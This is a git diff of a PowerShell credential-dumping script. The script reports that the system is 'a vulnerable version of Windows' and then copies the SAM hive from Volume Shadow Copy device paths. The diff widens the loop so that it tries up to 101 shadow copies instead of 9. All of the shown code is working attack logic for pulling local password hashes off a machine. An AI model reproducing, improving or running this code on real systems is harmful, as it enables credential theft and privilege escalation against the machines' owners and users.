@@ -46,7 +46,7 @@ else{
     Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "System is a vulnerable version of Windows"
 }
 
-for($i = 1; $i -le 9; $i++){
+for($i = 1; $i -le 101; $i++){
     try{
         [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\sam"), ($outSam + $i))
         Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SAM$i hive..."
